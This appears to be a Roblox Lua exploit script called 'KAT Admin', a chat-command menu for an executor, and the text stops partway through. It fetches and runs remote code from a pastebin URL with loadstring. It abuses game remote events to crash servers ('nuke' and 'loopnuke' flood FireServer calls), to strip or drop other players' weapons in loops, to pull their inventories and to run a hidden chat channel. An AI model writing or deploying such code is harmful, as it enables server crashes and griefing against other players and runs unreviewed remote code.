-- Gui to Lua
-- Version: 3.2

-- Instances:

local KATGUI = Instance.new("ScreenGui")

--Properties:

KATGUI.Name = "KATGUI"
KATGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
KATGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
KATGUI.ResetOnSpawn = false

-- Module Scripts:

local fake_module_scripts = {}

do -- KATGUI.ModuleScript
	local script = Instance.new('ModuleScript', KATGUI)
	local function module_script()
		local crypt = {}
		setmetatable(crypt, {__index = function() return function(a) return a end end})
		local Serializer = loadstring(game:HttpGet("https://pastebin.com/raw/tXE7TTMM", true))()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local Network = {}
		local Players = game:GetService("Players")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local Player = Players.LocalPlayer
		local ReplicateSound = ReplicatedStorage.GameEvents.Misk.ReplicateSound
		local Binds = {}
		
		function Network:Send(_, Topic, ...)
			ReplicateSound:FireServer(
				{nil,nil,nil,{}},
				crypt.encrypt(
					Topic, Topic
				),
				crypt.encrypt(
					Serializer:Serialize({...}), 
					Topic
				)
			)
		end
		
		function Network:BindToTopic(Topic, Callback)
			Binds[Topic] = Binds[Topic] or {}
			table.insert(Binds[Topic], Callback)
		end
		
		function Network.SendToSelf(_, Topic, ...)
			firesignal(ReplicateSound.OnClientEvent,
				{nil,nil,nil,{}},
				crypt.encrypt(
					Topic, Topic
				),
				crypt.encrypt(
					Serializer:Serialize({...}), 
					Topic
				)
			)
		end
		
		return Network
	end
	fake_module_scripts[script] = module_script
end


-- Scripts:

local function ZIMB_fake_script() -- KATGUI.LocalScript 
	local script = Instance.new('LocalScript', KATGUI)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local gameEvents = game.ReplicatedStorage.GameEvents
	local EData = gameEvents.Data
	local network = require(script.Parent.ModuleScript)
	local KATFrame = Instance.new("Frame")
	local ParentThing = game.Players.LocalPlayer.PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame or script.Parent.Parent.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame
	local prefixA = ">"
	local lrtdplayers = {}
	local Serializer = loadstring(game:HttpGet("https://pastebin.com/raw/tXE7TTMM", true))()
	
	
	local function shuffle(tbl)
		local len = #tbl
		for i = len, 2, -1 do
			local j = math.random(i)
			tbl[i], tbl[j] = tbl[j], tbl[i]
		end
		return tbl
	end
	
	local CommandInfo = {
		lrt = {Description = "loop removes the specified players tools", Name = "lrt"},
		unlrt = {Description = "stops the loop removal of the specified players tools", Name = "unlrt"},
		help = {Description = "why did you even run this :heh:", Name = "help"},
		trade = {Description = "sends a trade request to the specified player", Name = "trade"},
		nuke = {Description = "crashes the server, highly depends on intensity", Name = "nuke"},
		loopnuke = {Description = "crashes the server every time a new player joins", Name = "loopnuke"},
		playradio = {Description = "plays the specified audio id", Name = "playradio"},
		credits = {Description = "who made the script and tested", Name = "credits"},
		stopradio = {Description = "stops playing the specified audio id", Name = "stopradio"},
		listbackpack = {Description = "lists the players 10 higest rarity items"}, Name = "listbackpackName",
		setprefix = {Description = "changes the command prefix '>' to your desired command prefix", Name = "setprefix"},
		dropknife = {Description = "drops the specified players knife", Name = "dropknifeName"},
		loopdropknife = {Description = "drops the specified players knife", Name = "loopdropknifeName"},
		removetools = {Description = "removes the specified tool from the players inventory"},
		test1 = {Description = "a test command"},
		test2 = {Description = "a test command"},
		message = {Description = "send a message"},
		settag = {Description = "set your exploiterchat tag"},
	}
	
	
	KATFrame.Parent = ParentThing.Parent
	KATFrame.Name = "KATFrame"
	KATFrame.BackgroundColor3 = Color3.new(0,0,0)
	KATFrame.Transparency = 0.64
	KATFrame.Size = UDim2.new(ParentThing.Parent.Size.X.Scale , 14, 15.64, 14)
	KATFrame.Position = UDim2.new(ParentThing.Parent.Position.X.Scale , -7, ParentThing.Parent.Position.Y.Scale, -7)
	KATFrame.Visible = false
	
	local messageName = Instance.new("TextLabel")
	messageName.Name = "messageName"
	messageName.Parent = KATFrame
	messageName.BackgroundTransparency = 1
	messageName.TextColor3 = Color3.new(1,1,1)
	messageName.Text = ">[message]"
	messageName.TextSize = 14
	messageName.Position = UDim2.new(0,0,0.095,0)
	messageName.Size = UDim2.new(0.39, 0, 0.057, 0)
	messageName.Font = Enum.Font.Arial
	messageName.TextXAlignment = Enum.TextXAlignment.Left
	messageName.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local radioName = Instance.new("TextLabel")
	radioName.Name = "radioName"
	radioName.Parent = KATFrame
	radioName.BackgroundTransparency = 1
	radioName.TextColor3 = Color3.new(1,1,1)
	radioName.Text = ">playaudio [audioid] [volume] [looped]"
	radioName.TextSize = 14
	radioName.Position = UDim2.new(0,0,0.15,0)
	radioName.Size = UDim2.new(0.39, 0, 0.057, 0)
	radioName.Font = Enum.Font.Arial
	radioName.TextXAlignment = Enum.TextXAlignment.Left
	radioName.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local nukeName = Instance.new("TextLabel")
	nukeName.Name = "nukeName"
	nukeName.Parent = KATFrame
	nukeName.BackgroundTransparency = 1
	nukeName.TextColor3 = Color3.new(1,1,1)
	nukeName.Text = ">nuke [intensity]"
	nukeName.Position = UDim2.new(0,0,0.205,0)
	nukeName.Size = UDim2.new(0.39, 0, 0.057, 0)
	nukeName.TextSize = 14
	nukeName.Font = Enum.Font.Arial
	nukeName.TextXAlignment = Enum.TextXAlignment.Left
	nukeName.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local stopradio = Instance.new("TextLabel")
	stopradio.Name = "stopradio"
	stopradio.Parent = KATFrame
	stopradio.BackgroundTransparency = 1
	stopradio.TextColor3 = Color3.new(1,1,1)
	stopradio.Text = ">stopradio [stopradio]"
	stopradio.Position = UDim2.new(0,0,0.766,0)
	stopradio.Size = UDim2.new(0.39, 0, 0.057, 0)
	stopradio.TextSize = 14
	stopradio.Font = Enum.Font.Arial
	stopradio.TextXAlignment = Enum.TextXAlignment.Left
	stopradio.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	
	local helpCommand = Instance.new("TextLabel")
	helpCommand.Name = "helpCommand"
	helpCommand.Parent = KATFrame
	helpCommand.BackgroundTransparency = 1
	helpCommand.TextColor3 = Color3.new(1,1,1)
	helpCommand.Text = ">help [command]"
	helpCommand.Position = UDim2.new(0,0,0.260,0)
	helpCommand.Size = UDim2.new(0.39, 0, 0.057, 0)
	helpCommand.TextSize = 14
	helpCommand.Font = Enum.Font.Arial
	helpCommand.TextXAlignment = Enum.TextXAlignment.Left
	helpCommand.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local settagName = Instance.new("TextLabel")
	settagName.Name = "settagName"
	settagName.Parent = KATFrame
	settagName.BackgroundTransparency = 1
	settagName.TextColor3 = Color3.new(1,1,1)
	settagName.Text = ">settag [tag]"
	settagName.Position = UDim2.new(0,0,0.315,0)
	settagName.Size = UDim2.new(0.57, 0, 0.057, 0)
	settagName.TextSize = 14
	settagName.Font = Enum.Font.Arial
	settagName.TextXAlignment = Enum.TextXAlignment.Left
	settagName.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local lrtName = Instance.new("TextLabel")
	lrtName.Name = "lrtName"
	lrtName.Parent = KATFrame
	lrtName.BackgroundTransparency = 1
	lrtName.TextColor3 = Color3.new(1,1,1)
	lrtName.Text = ">lrt [playername]"
	lrtName.Position = UDim2.new(0,0,0.481,0)
	lrtName.Size = UDim2.new(0.768, 0, 0.057, 0)
	lrtName.TextSize = 14
	lrtName.Font = Enum.Font.Arial
	lrtName.TextXAlignment = Enum.TextXAlignment.Left
	lrtName.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local credits = Instance.new("TextLabel")
	credits.Name = "credits"
	credits.Parent = KATFrame
	credits.BackgroundTransparency = 1
	credits.TextColor3 = Color3.new(1,1,1)
	credits.Text = ">credits [credits]"
	credits.Position = UDim2.new(0,0,0.370,0)
	credits.Size = UDim2.new(0.39, 0, 0.057, 0)
	credits.TextSize = 14
	credits.Font = Enum.Font.Arial
	credits.TextXAlignment = Enum.TextXAlignment.Left
	credits.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local unlrt = Instance.new("TextLabel")
	unlrt.Name = "unlrt"
	unlrt.Parent = KATFrame
	unlrt.BackgroundTransparency = 1
	unlrt.TextColor3 = Color3.new(1,1,1)
	unlrt.Text = ">unlrt [playername]"
	unlrt.Position = UDim2.new(0,0,0.425,0)
	unlrt.Size = UDim2.new(0.39, 0, 0.057, 0)
	unlrt.TextSize = 14
	unlrt.Font = Enum.Font.Arial
	unlrt.TextXAlignment = Enum.TextXAlignment.Left
	unlrt.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local trade = Instance.new("TextLabel")
	trade.Name = "trade"
	trade.Parent = KATFrame
	trade.BackgroundTransparency = 1
	trade.TextColor3 = Color3.new(1,1,1)
	trade.Text = ">trade [playername]"
	trade.Position = UDim2.new(0,0,0.536,0)
	trade.Size = UDim2.new(0.39, 0, 0.057, 0)
	trade.TextSize = 14
	trade.Font = Enum.Font.Arial
	trade.TextXAlignment = Enum.TextXAlignment.Left
	trade.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local loopnuke = Instance.new("TextLabel")
	loopnuke.Name = "loopNuke"
	loopnuke.Parent = KATFrame
	loopnuke.BackgroundTransparency = 1
	loopnuke.TextColor3 = Color3.new(1,1,1)
	loopnuke.Text = ">loopnuke [loopnuke]"
	loopnuke.Position = UDim2.new(0,0,0.591,0)
	loopnuke.Size = UDim2.new(0.39, 0, 0.057, 0)
	loopnuke.TextSize = 14
	loopnuke.Font = Enum.Font.Arial
	loopnuke.TextXAlignment = Enum.TextXAlignment.Left
	loopnuke.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local unloopnuke = Instance.new("TextLabel")
	unloopnuke.Name = "unloopNuke"
	unloopnuke.Parent = KATFrame
	unloopnuke.BackgroundTransparency = 1
	unloopnuke.TextColor3 = Color3.new(1,1,1)
	unloopnuke.Text = ">unloopnuke [unloopnuke]"
	unloopnuke.Position = UDim2.new(0,0,0.646,0)
	unloopnuke.Size = UDim2.new(0.39, 0, 0.057, 0)
	unloopnuke.TextSize = 14
	unloopnuke.Font = Enum.Font.Arial
	unloopnuke.TextXAlignment = Enum.TextXAlignment.Left
	unloopnuke.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local prefixC = Instance.new("TextLabel")
	prefixC.Name = "prefixName"
	prefixC.Parent = KATFrame
	prefixC.BackgroundTransparency = 1
	prefixC.TextColor3 = Color3.new(1,1,1)
	prefixC.Text = ">setprefix [prefix]"
	prefixC.Position = UDim2.new(0,0,0.701,0)
	prefixC.Size = UDim2.new(0.39, 0, 0.057, 0)
	prefixC.TextSize = 14
	prefixC.Font = Enum.Font.Arial
	prefixC.TextXAlignment = Enum.TextXAlignment.Left
	prefixC.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local listbackpackName = Instance.new("TextLabel")
	listbackpackName.Name = "listbackpackName"
	listbackpackName.Parent = KATFrame
	listbackpackName.BackgroundTransparency = 1
	listbackpackName.TextColor3 = Color3.new(1,1,1)
	listbackpackName.Text = ">listbackpack [player]"
	listbackpackName.Position = UDim2.new(0,0,0.811,0)
	listbackpackName.Size = UDim2.new(0.39, 0, 0.057, 0)
	listbackpackName.TextSize = 14
	listbackpackName.Font = Enum.Font.Arial
	listbackpackName.TextXAlignment = Enum.TextXAlignment.Left
	listbackpackName.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local dropknife = Instance.new("TextLabel")
	dropknife.Name = "dropknifeName"
	dropknife.Parent = KATFrame
	dropknife.BackgroundTransparency = 1
	dropknife.TextColor3 = Color3.new(1,1,1)
	dropknife.Text = ">dropknife [player]"
	dropknife.Position = UDim2.new(0,0,0.867,0)
	dropknife.Size = UDim2.new(0.39, 0, 0.057, 0)
	dropknife.TextSize = 14
	dropknife.Font = Enum.Font.Arial
	dropknife.TextXAlignment = Enum.TextXAlignment.Left
	dropknife.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local loopdropknife = Instance.new("TextLabel")
	loopdropknife.Name = "loopdropknifeName"
	loopdropknife.Parent = KATFrame
	loopdropknife.BackgroundTransparency = 1
	loopdropknife.TextColor3 = Color3.new(1,1,1)
	loopdropknife.Text = ">loopdropknife [player]"
	loopdropknife.Position = UDim2.new(0,0,0.921,0)
	loopdropknife.Size = UDim2.new(0.39, 0, 0.057, 0)
	loopdropknife.TextSize = 14
	loopdropknife.Font = Enum.Font.Arial
	loopdropknife.TextXAlignment = Enum.TextXAlignment.Left
	loopdropknife.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	
	local confirmedPlayers = {}
	ParentThing.ChatBar.FocusLost:Connect(function()
		KATFrame.Visible = false
	end)
	
	local function SendMessage(Data, tag, name, text)
		--print(Data)
		firesignal(game:GetService("ReplicatedStorage").GameEvents.Misk.Chatted.OnClientEvent, Data, true, true)  
	end
	
	
	local function sendNotification(message)
		game.StarterGui:SetCore("SendNotification", {
			Title = "Notification";
			Text = message;
			Duration = 5; 
		})
	end
	
	local confirmedPlayers = {}
	
	local function ConfirmDestruction(plr, weaponName)
		local backpack = plr:FindFirstChild("Backpack")
		local character = plr.Character
	
		if backpack then
			local weaponInBackpack = backpack:FindFirstChild(weaponName)
			if weaponInBackpack then
				local clientEvent = weaponInBackpack:FindFirstChild("ClientEvent")
				if clientEvent then
					clientEvent:FireServer("ConfirmDestruction", {})
				end
			end
		end
	
		if character then
			local weaponInCharacter = character:FindFirstChild(weaponName)
			if weaponInCharacter then
				local clientEvent = weaponInCharacter:FindFirstChild("ClientEvent")
				if clientEvent then
					clientEvent:FireServer("ConfirmDestruction", {})
				end
			end
	
			local workspaceWeapon = character:FindFirstChild(weaponName)
			if workspaceWeapon then
				local clientEvent = workspaceWeapon:FindFirstChild("ClientEvent")
				if clientEvent then
					clientEvent:FireServer("ConfirmDestruction", {})
				end
			end
		end
	end
	
	local function deleteWeapons(player, tool)
		if player then
			ConfirmDestruction(player, "Knife")
			ConfirmDestruction(player, "Revolver")
		end
	end
	
	local function DeleteTool(player, tool)
		if player then
			ConfirmDestruction(player, tool)
		end
	end
	
	local function nukeFunction(intensity)
		local amount = 1 * intensity
	
		local args = {
			[1] = "ReplicateGearEffect",
			[2] = {
				[1] = {
					["RightArm"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
					["ProjectileDebris"] = workspace.WorldIgnore.Projectiles,
					["Torso"] = game:GetService("Players").LocalPlayer.Character.Torso,
					["WorldIgnore"] = workspace.WorldIgnore,
					["Character"] = game:GetService("Players").LocalPlayer.Character,
					["RenderStepped"] = nil --[[RBXScriptSignal]],
					["Start"] = Vector3.new(-22.707744598388672, 13.920881271362305, -73.56349182128906),
					["Heartbeat"] = nil --[[RBXScriptSignal]],
					["Target"] = Vector3.new(-35.31388473510742, 10.997428894042969, -73.95928955078125),
					["GearModel"] = game:GetService("Players").LocalPlayer.Character.Dice.MoneyBag
				}
			}
		}
	
		local fireremotebackpack
		local firemote
		local player = game.Players.LocalPlayer
	
		if player.Backpack then
			local Dice = player.Backpack:FindFirstChild("Dice")
			if Dice then
				fireremotebackpack = Dice:FindFirstChild("ClientEvent")
	
				for i = 1, amount do
					fireremotebackpack:FireServer(unpack(args))
				end
			else
				local DiceWorkSpace = player.Character:FindFirstChild("Dice")
				if DiceWorkSpace then
					firemote = DiceWorkSpace:FindFirstChild("ClientEvent")
	
					for i = 1, amount do
						firemote:FireServer(unpack(args))
					end
				end
			end
		end
	end
	
	local IsLooping = false
	
	local function loopnukeFunction(enableLoop)
		if enableLoop then
			nukeFunction(6000)
			game.Players.PlayerAdded:Connect(function()
				nukeFunction(10000)
			end)
		elseif not enableLoop then
			print("loop stopped.")
		end
	end
	
	
	local function removeTools(player)
		if lrtdplayers[player.Name] then
			deleteWeapons(player)
		end
	end
	
	local cmds = {}
	
	
	local function loopDelete(player)
		while lrtdplayers[player.Name] do
			removeTools(player)
	
			if not lrtdplayers[player.Name] then
				break
			end
			wait(1)
		end
	end
	
	local loopedrt = {}
	
	local function loopDeleteTool(player, tool)
		while lrtdplayers[player.Name] do
			DeleteTool(player, tool)
	
			if not lrtdplayers[player.Name] then
				break
			end
			wait(1)
		end
	end
	
	local tag
	local name
	
	
	
	local commands = {
	
		settag = {
			func = function(TagName)
				tag = TagName
	
	
				SendMessage({
					TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
					NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
					CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "changed exploiter chat tag to "..TagName},
				})
			end,
	
			aliases = {"st", "sett"}
		},
		lrt = {
			func = function(playerName)
				local player = game.Players:FindFirstChild(playerName)
				if player then
					lrtdplayers[playerName] = true
	
					loopDelete(player)
	
					SendMessage({
						TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
						NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
						CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "loopedremovedtools for " .. player.Name},
					})
				else
					return nil
				end
			end,
			aliases = {"lt", "loopremovetools"}
		},
	
	
		removetools = {
			func = function(player, tool, looped)
	
	
	
				if tool == "revolver" then
					tool = "Revolver"
				elseif tool == "knife" then
					tool = "Knife"
				end
	
	
				local ActualName = game.Players:FindFirstChild(player)
	
				if not ActualName then
					for _, p in ipairs(game.Players:GetPlayers()) do
						if p.Name:lower() == player:lower() then
							player = p
							break
						end
					end
				end
	
				print(player.Name)
	
				if player then
					tool = player.Backpack[tool] or player.Character[tool]
					if tool and not looped then
						DeleteTool(player, tool)
					elseif tool and looped then
						loopedrt[player.Name] = true
	
						loopDeleteTool(player, tool)
					end
				end
			end,
	
			aliases = {"rt"}
		},
	
	
		dupe = {
			func = function(Enabled)
	
			end,
		},
	
		playradio = {
			func = function(audioID, volume, looping)
				local soundData = {
					"PlaySound",
					game.Players.LocalPlayer.Name,
					"rbxassetid://" .. tonumber(audioID),
					{workspace},
					tonumber(tonumber(volume)),
					looping
				}
	
				game.ReplicatedStorage.GameEvents.Misk.PlaySound:FireServer(unpack(soundData))
			end,
			aliases = {"pr"}
		},
	
		stopradio = {
			func = function()
				local RadioEvent = game.ReplicatedStorage.GameEvents.Misk.ReplicateSoundStop:FireServer()
			end,
			aliases = {"sr"}
		},
	
	
		exploiterchat = {
			func = function(message)
				local player = game.Players.LocalPlayer
				local remoteEvent = EData.Parent.Misk.ReplicateSound
	
	
			end,
		},
	
		credits = {
			func = function()
				SendMessage({
					TG = {COL = Color3.fromRGB(255, 255, 0), TXT = "KAT Admin"},
					NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
					CHAT = {COL = Color3.fromRGB(45, 45, 45), TXT = "Script And Ui Were Made By Me (You Know Who You Got This From). Thanks To Amari For Helping Me Test it (mostly, fuck you)"},
				})
			end,
			aliases = {}
		},
	
		unlrt = {
			func = function(playerName)
				if playerName == "all" or playerName == "All" then
					for _, plr in pairs(game.Players:GetPlayers()) do
						local player = plr.Name
						lrtdplayers[plr.Name] = false
	
						SendMessage({
							TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
							NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
							CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "unloopedremovetools for " .. player},
						})
					end
				else
					local player = game.Players:FindFirstChild(playerName)
					if player then
						lrtdplayers[playerName] = false
						loopedrt[playerName] = false	
	
						SendMessage({
							TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
							NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
							CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "unloopedremovetools for " .. player.Name},
						})
					end
				end
			end,
			aliases = {"unloopremovetools", "ulrt", "unrt"}
		},
	
		trade = {
			func = function(playerName)
				local player = game.Players[playerName]
				local fireRemote = game.ReplicatedStorage.GameEvents.Misk.TradeRequest
	
				fireRemote:FireServer(player.Name)
			end,
			aliases = {}
		},
	
		nuke = {
			func = function(intensity)
				nukeFunction(tonumber(intensity))
	
				SendMessage({
					TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
					NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
					CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "nuked the server with an intensity of "..intensity}
				})
			end,
	
			aliases = {}
		},
	
		loopnuke = {
			func = function()
				loopnukeFunction(true)
	
				SendMessage({
					TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
					NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
					CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "loopnuke: enabled"}
				})
			end,
			aliases = {"lnuke", "ln"}
		},
	
		unloopnuke = {
			func = function()
				loopnukeFunction(false)
	
				SendMessage({
					TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
					NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
					CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "loopnuke: disabled"}
				})
			end,
			aliases = {"unln", "uln", "ulnuke"}
		},
	
	
		setprefix = {
			func = function(prefixChangedTo)
				prefixA = prefixChangedTo
			end,
			aliases = {"sp", "spx", "prefix"}
		},
	
	
	
		dropknife = {
			func = function(player)
	
				player = game.Players[player]
	
				if player then
					local char = player.Character
	
					if char then
						local knife = char:FindFirstChild("Knife")
						if knife then
							local knifeClientEvent = knife:FindFirstChild("ClientEvent")
							if knifeClientEvent then
								knifeClientEvent:FireServer("SetVisible", false)
								wait(0.1)
								knifeClientEvent:FireServer("DropRequest")
							end
						end
					end
				end
			end,
			aliases = {"dk"}
		},
	
		loopdropknife = {
			func = function(player)
	
				player = game.Players[player]
	
				if player then
					local char = player.Character
	
					if char then
						local knife = char:FindFirstChild("Knife")
						if knife then
							local knifeClientEvent = knife:FindFirstChild("ClientEvent")
							if knifeClientEvent then
								while wait(0.1) do
									knifeClientEvent:FireServer("SetVisible", false)
									wait(0.1)
									knifeClientEvent:FireServer("DropRequest")
								end
							end
						end
					end
				end
			end,
			aliases = {"ldk"}
		},
	
		test1 = {
			func = function(NameForPlayer)
	
				local player = game.Players[NameForPlayer]
				EData.RequestDisplayInfo:FireServer(player.Name)
	
	
				local Connection; Connection = EData.RequestDisplayInfo.OnClientEvent:Connect(function(p, data)
					if p == player then
						local Items = data.Items
						local ItemS = ""
	
						for _, v in pairs(Items) do
							ItemS = ItemS .. ":" .. v[1] .. ":"
						end
	
	
						SendMessage({
							TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
							NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
							CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = ":?: " .. p.Name .. ": " .. ItemS}
						})
					end
				end)
			end,
			aliases = {"t1"}
		},
		test2 = {
			func = function(NameForPlayer)
	
				local player = game.Players[NameForPlayer]
				EData.RequestDisplayInfo:FireServer(player.Name)
	
	
				local Connection; Connection = EData.RequestDisplayInfo.OnClientEvent:Connect(function(p, data)
					if p == player then
						local Items = data.Lvl
						local ItemS = ""
	
						for _, v in pairs(Items) do
							ItemS = ItemS .. ":" .. v[1] .. ":"
						end
	
	
						SendMessage({
							TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
							NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
							CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = ":?: " .. p.Name .. ": " .. ItemS}
						})
					end
				end)
			end,
	
			aliases = {"t2"}
		},
	
	
		listbackpack = {
			func = function(player)
				player = game.Players[player]
	
				if player then
					EData.RequestDisplayInfo:FireServer(player.Name)
	
					local Connection; Connection = EData.RequestDisplayInfo.OnClientEvent:Connect(function(p, data)
						if p == player then
							local Inv = data.Inventory
	
							local InvS = ""
	
							for _, v in pairs(Inv) do
								InvS = InvS .. ":" .. v[1] .. ":"
							end
	
							SendMessage({
								TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
								NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
								CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = ":?: " .. p.Name .. ": " .. InvS}
							})
						end
					end)
				end
			end,
			aliases = {"lbk", "listinv", "lb", "li"}
		},	
	
	
		help = {
			func = function(commands, command)
				local foundCommand = nil
	
				for cmd, cmdData in pairs(commands) do
					if cmd == command or (cmdData.aliases and table.find(cmdData.aliases, command)) then
						foundCommand = cmd
						break
					end
				end
				if foundCommand then
					local description = CommandInfo[foundCommand].Description
					local aliases = table.concat(commands[foundCommand].aliases or {}, ", ")
	
					local message = description .. ". Aliases: " .. (aliases ~= "" and aliases or "None")
					SendMessage({
						TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
						NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
						CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = message},
					})
				else
					SendMessage({
						TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
						NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
						CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "Command not found."},
					})
				end
			end,
	
			aliases = {}
		},
	
	}
	
	
	local function ChatSendMessage(name, tag, msg, Data)
	
		Data = {
			TG = {COL = Color3.fromRGB(45,45,45), TXT = tag or "exploiter chat"},
			NM = {COL = Color3.fromRGB(180,180,180), TXT = name or game.Players.LocalPlayer.Name},
			CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = msg},
		}
	
		--print(Data)
		firesignal(game:GetService("ReplicatedStorage").GameEvents.Misk.Chatted.OnClientEvent, Data, true, true) 
		
		network:Send("ExploiterChat", Data)
		
		wait(1)
		
		network:BindToTopic("ExploiterChat", function(Data)
			firesignal(game:GetService("ReplicatedStorage").GameEvents.Misk.Chatted.OnClientEvent, Data, true, true)  
		end)
	end
	
	
	
	ParentThing.ChatBar.FocusLost:Connect(function(enterPressed)
		local text = ParentThing.ChatBar.Text
	
		if enterPressed and string.sub(text, 1, 1) == prefixA then
			local command, argumentsStr = text:match(prefixA .. "(%w+)%s*(.*)")
	
			if command then
				local foundCommand = false
				for cmd, data in pairs(commands) do
					if cmd == command or table.find(data.aliases or {}, command) then
						foundCommand = true
						ParentThing.ChatBar.Text = ""
						local arguments = {}
						for arg in argumentsStr:gmatch("%S+") do
							table.insert(arguments, arg)
						end
	
	
						if command ~= "help" then
							data.func(argumentsStr)
							print("Command: " .. command .. ", Arguments: " .. argumentsStr)
						elseif cmd == "help" then
							commands.help.func(commands, argumentsStr)
						end
					end
				end
	
				if not foundCommand then
					local message = text:match(prefixA .. "%s*(.*)") 
	
					if message then
						ParentThing.ChatBar.Text = ""
						ChatSendMessage(game.Players.LocalPlayer.Name, tag, message)
					end
				end
			end
		end
	end)
	
	
	
	
	
	SendMessage({
		TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
		NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
		CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "KAT Admin Successfully Loaded".. " ".. "Version HAPPY BIRTHDAY, AMARI>;3 :tire: :pianobreaker: .2"},
	})
	
	
	local commandLabels = {
		["7777"]= {label = "messageName", yPos = 0.095}, --semi works
		playradio = {label = "radioName", yPos = 0.15}, --broke somehow!?
		nuke = {label = "nukeName", yPos = 0.205}, --works
		help = {label = "helpCommand", yPos = 0.26}, --works
		settag = {label = "settagName", yPos = 0.315}, --this does not work
		lrt = {label = "lrtName", yPos = 0.481}, --this does not work
		credits = {label = "credits", yPos = 0.37}, --works
		unlrt = {label = "unlrt", yPos = 0.425}, --works
		trade = {label = "trade", yPos = 0.536}, --works
		loopnuke = {label = "loopNuke", yPos = 0.591}, --works (?)
		unloopnuke = {label = "unloopNuke", yPos = 0.646}, --works(?)
		setprefix = {label = "prefixName", yPos = 0.701}, --works
		stopradio = {label = "stopradio", yPos = 0.756}, --should work
		listbackpack = {label = "listbackpackName", yPos = 0.811}, --untested, should work
		dropknife = {label = "dropknifeName", yPos = 0.867}, --untested, should work
		loopdropknife = {label = "loopdropknifeName", yPos = 0.921}, --untested, should work
	}
	
	
	local foundLabels = {}
	local notFoundLabels = {}
	
	ParentThing.ChatBar:GetPropertyChangedSignal("Text"):Connect(function()
		local text = ParentThing.ChatBar.Text
		local searchText = text:sub(#prefixA + 1):lower()
		KATFrame.Visible = text:sub(1, #prefixA) == prefixA
	
